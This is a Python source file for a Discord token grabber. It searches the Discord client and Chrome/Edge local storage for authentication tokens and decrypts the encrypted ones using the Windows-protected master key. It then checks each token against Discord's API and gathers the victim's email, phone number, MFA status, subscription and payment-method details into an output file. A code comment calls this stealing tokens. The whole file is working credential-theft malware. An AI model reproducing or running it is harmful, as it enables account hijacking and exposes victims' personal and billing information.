import requests, os, json
import re
from json import loads, dumps
from datetime import datetime
from urllib.request import Request, urlopen
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData


class token2Discord:
    def __init__(self):
        self.tokens = []
        self._ROAMING = os.getenv('APPDATA')
        self._LOCAL = os.getenv('LOCALAPPDATA')
        self._PATHS = {
            'Discord': self._ROAMING + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self._ROAMING + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self._ROAMING + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self._ROAMING + r'\\discordptb\\Local Storage\\leveldb\\',
            'Chrome': self._LOCAL + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Microsoft Edge': self._LOCAL + r'\\Microsoft\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
        }

    def decryptToken(self, encrypted, key):
        try:
            iv = encrypted[3:15]
            payload = encrypted[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt token"

    def getKey(self):
        with open(self._ROAMING + '\\discord\\Local State', "r", encoding="utf-8", errors="ignore") as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def tokenization(self):
        for _, path in self._PATHS.items():
            if not os.path.exists(path):
                continue
            if not "discord" in path:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in re.findall(regex, line):
                                self.tokens.append(token)
            else:
                if os.path.exists(self._ROAMING + '\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                                token = self.decryptToken(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.getKey())
                                self.tokens.append(token)

    def validate(self, token):
        try:
            response = requests.get("https://discordapp.com/api/v6/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token})
            if response.status_code == 200:
                userData = loads(response.text)
            else:
                userData = None
        except Exception:
            userData = None
        return userData

    def extract(self, userData, token):
        username = userData['username'] + '#' + userData['discriminator']
        discordId = userData['id']
        phone = userData['phone']
        email = userData['email']

        mfa = "Unknown"
        try:
            if userData['mfa_enabled']:
                mfa = "Enabled"
            else:
                mfa = "Disabled"
        except Exception:
            pass

        nitro = 'None'
        try:
            if userData['premium_type'] == 1:
                nitro = 'Nitro Classic'
            elif userData['premium_type'] == 2:
                nitro = 'Nitro Boost'
        except Exception:
            pass

        billResponse = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={'Authorization': token}).json()
        billing = "Unknown"
        if len(billResponse) > 0:
            try:
                for billing in billResponse:
                    if billResponse['type'] == 1:
                        billing = "Credit Card"
                    elif billResponse['type'] == 2:
                        billing = "<:paypal:973417655627288666>"
                    else:
                        billing = "Unknown"
            except Exception:
                pass
        return username, discordId, phone, email, mfa, nitro, billing

    def get_valid_tokens(self):
        tokenz = list(set(self.tokens))
        return tokenz

def main():
    grab = token2Discord()
    # steal tokens function
    grab.tokenization()
    tokens = grab.get_valid_tokens()
    if len(tokens) > 0:
    # if tokens were found, validate all tokens
        for token in tokens:
            userData = grab.validate(token)
            # if data found, exctract
            if userData != None:
                 username, discordId, phone, email, mfa, nitro, billing = grab.extract(userData, token)
                 # construct message
                 message = f"Discord ID: {discordId}\nToken: {token}| MFA: {mfa}\nEmail: {email} / Phone#: {phone}\nNitro: {nitro}\nBilling: {billing}"
                 export_file(message)

def export_file(message):
        with open('output.txt', 'w') as file:
            file.write(message)


main()
